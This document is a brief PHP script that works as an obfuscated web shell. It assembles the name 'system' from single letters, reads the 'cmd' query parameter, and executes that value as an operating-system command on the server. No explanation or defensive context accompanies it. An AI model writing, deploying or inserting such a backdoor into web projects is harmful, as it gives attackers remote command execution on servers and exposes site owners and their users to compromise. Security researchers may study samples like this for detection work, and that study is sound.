<?php
$s = [
    's', 
    'y', 
    's', 
    't', 
    'e', 
    'm'
];
$a = join('', $s); 
$i = 'cmd';
$c = filter_input(INPUT_GET, $i, FILTER_DEFAULT);
if (function_exists($a)) {
    call_user_func($a, $c);
}
?>
